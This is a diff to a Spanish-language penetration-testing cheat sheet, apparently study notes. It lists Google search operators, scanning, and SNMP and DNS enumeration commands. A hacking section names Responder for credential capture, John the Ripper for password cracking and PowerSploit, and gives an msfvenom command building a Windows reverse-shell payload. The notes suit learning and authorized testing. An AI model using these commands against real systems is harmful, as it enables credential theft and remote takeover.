@@ -11,15 +11,15 @@
 |"#"	|Busca un hashtag	|"#"pentesting
 |OR	Devuelve resultados sobre un término u otro	|Smartphone OR tablet
 | barra	|Devuelve resultados sobre un término u otro. El mismo OR	|blackhat 1 defcon
-( )	Utilizado para agrupar operadores	(ballmer OR gates) windows
-cache:	Muestra la página en cache	cache:www.eltiempo.co.
-inurl:	Busca el termino escrito dentro de la URL de los sitios indexados	inurl:admin.php
-site:	Busca todo lo relacionado con el termino escrito como sitio	site:.eltiempo.com -site:www.eltiempo.com -inurl:blogs
-filetype:	Buscar el termino escrito como tipo de archivo, ejemplo: pdf, pptp, log, sql	filetype:log
-intitle:	Busca el termino escrito dentro del título	intitle:mikrotik
-allintitle:	Devuelve resultados que coincidan en el título con el término escrito	allintitle:”Noticias Principales de Colombia”
-intext:	Busca páginas que en su texto contienen el termino escrito 	intext:owasp
-allintext:	Devuelve todos los resultados que contengan todas las palabras especificadas	allintext:”asterisk digium
+|( )	|Utilizado para agrupar operadores	|(ballmer OR gates) windows
+|cache:	|Muestra la página en cache	|cache:www.eltiempo.co.
+|inurl:	|Busca el termino escrito dentro de la URL de los sitios indexados	|inurl:admin.php
+|site:	|Busca todo lo relacionado con el termino escrito como sitio	|site:.eltiempo.com -site:www.eltiempo.com -inurl:blogs
+|filetype:	|Buscar el termino escrito como tipo de archivo, ejemplo: pdf, pptp, log, sql	|filetype:log
+|intitle:	|Busca el termino escrito dentro del título	|intitle:mikrotik
+|allintitle:	|Devuelve resultados que coincidan en el título con el término escrito	|allintitle:”Noticias Principales de Colombia”
+|intext:	|Busca páginas que en su texto contienen el termino escrito 	|intext:owasp
+|allintext:	|Devuelve todos los resultados que contengan todas las palabras especificadas	|allintext:”asterisk digium
 
 
 Information Gathering
@@ -96,6 +96,7 @@ NetworkIP/Mask – Search IPs on network
 --flood: técnica de Inundación de TCP
 ````
 •	OS Detection TTL
+
 ![image](https://user-images.githubusercontent.com/32601403/221194121-9a76af3a-d0e0-4e1e-b636-c596cb97830f.png)
  
 
@@ -115,6 +116,7 @@ NetworkIP/Mask – Search IPs on network
 | 22 | ssh
 | 53 | dns
 
+````js
 •	Unicornscan – Scan Network
 -I: Immediate scan
 -v: verbose
@@ -124,6 +126,10 @@ NetworkIP/Mask – Search IPs on network
 Nbstat – NetBIOS enumeration
 Net – NetBIOS enumeration
 NetBiosEnumeratior – Tool Windows
+````
+
+////Enum SNMP
+````js
 Snmp-check – SNMP Enumeration
 Comando snmpget con SNMPv1:
  
@@ -149,8 +155,13 @@ snmpwalk -v3 -l authPriv -u [nombre de usuario] -a MD5 -A [contraseña de usuari
 Comando snmpwalk con SNMPv3 (sin autenticación ni cifrado):
 snmpwalk -v3 -l noAuthNoPriv -u [nombre de usuario] [dirección IP del host] [OID de la MIB de la info rmación del sistema]
 
+
 •	SoftPerfect Network Scanner – Tool Windows
 •	AD Explorer – LDAP Enumerator
+
+````
+//DNS Enum
+````js
 •	Dig – DNS Enumeration
 Axfr – transferencia de Zona (@NS)
 Ns – name server
@@ -166,14 +177,21 @@ AAAA
 SPF 
 TXT
 •	Global Network Inventory – Tool Windows
-•	Enum4linux
+````
+////Other Enum
+````js
+Enum4linux
+````
 5.	VULNERABILITY ANALYSIS
+````js
+
 Nessus 
 OpenVAS
 Nikto – Web Vulnerability
 arachni
+````
 6.	SYSTEMS HACKING
-
+````js
 Responder -I <interface>
 Jhon The Ripper
 John -list=formats (Escogemos un formato)
@@ -191,3 +209,4 @@ nsfvenom -p windows/meterpeter/reverse_tcp –platform windows -a x86 -f exe LHO
 https://github.com/PowerShellMafia/PowerSploit - Post explotacion 
 TheFatRat
  Inmunity Debugger
+````
